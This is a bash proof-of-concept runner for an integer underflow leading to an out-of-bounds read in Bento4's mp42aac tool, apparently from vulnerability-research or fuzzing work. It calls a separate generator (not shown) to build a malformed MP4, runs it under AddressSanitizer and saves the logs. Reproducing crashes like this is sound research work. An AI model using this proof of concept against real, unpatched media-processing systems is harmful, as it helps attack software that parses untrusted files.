#!/bin/bash
# PoC runner for AP4_EsDescriptor integer underflow (CWE-191)
# Bento4 mp42aac – EsDescriptor SubStream integer underflow → OOB read

DIR=/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Expandable_h
MP42AAC=/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac

# Step 1: generate the malformed mp4
python3 "$DIR/vuln_002_gen.py"

# Step 2: run mp42aac under ASAN, capture output + ASAN log
ASAN_OPTIONS="abort_on_error=0:log_path=$DIR/asan.log" \
  "$MP42AAC" \
  "$DIR/vuln_002.mp4" /dev/null \
  > "$DIR/vuln_002_result.txt" 2>&1 || true

# Step 3: append any ASAN log files
for f in "$DIR"/asan.log.*; do
  [ -f "$f" ] && cat "$f" >> "$DIR/vuln_002_result.txt"
done

echo "Done. Results written to $DIR/vuln_002_result.txt"
